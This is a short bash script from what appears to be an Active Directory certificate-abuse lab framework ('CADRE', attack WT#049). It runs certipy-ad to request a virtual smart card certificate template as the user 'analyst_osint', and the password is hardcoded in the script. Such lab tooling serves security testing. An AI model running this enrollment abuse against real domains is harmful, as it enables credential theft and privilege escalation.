#!/bin/bash
# CADRE — WT#049 Virtual Smart Card Enrollment
source ../lib/cadre-env.sh
source ../lib/common.sh
print_banner "WT#049 — Virtual Smart Card Enrollment"
start_attack "049" "Virtual Smart Card Enrollment"

require_tool certipy-ad
require_env CA_NAME "CA_NAME"
require_env DC03 "DC03"
require_env DOMAIN_EXT "DOMAIN_EXT"

step "Request CADRE-VSC certificate template as analyst_osint"
run_cmd "certipy-ad req -ca $CA_NAME -template CADRE-VSC -u \"analyst_osint@$DOMAIN_EXT\" -p '0S1NT_An@lyst!' -dc-ip $DC03"

result $? "Virtual Smart Card Enrollment completed"
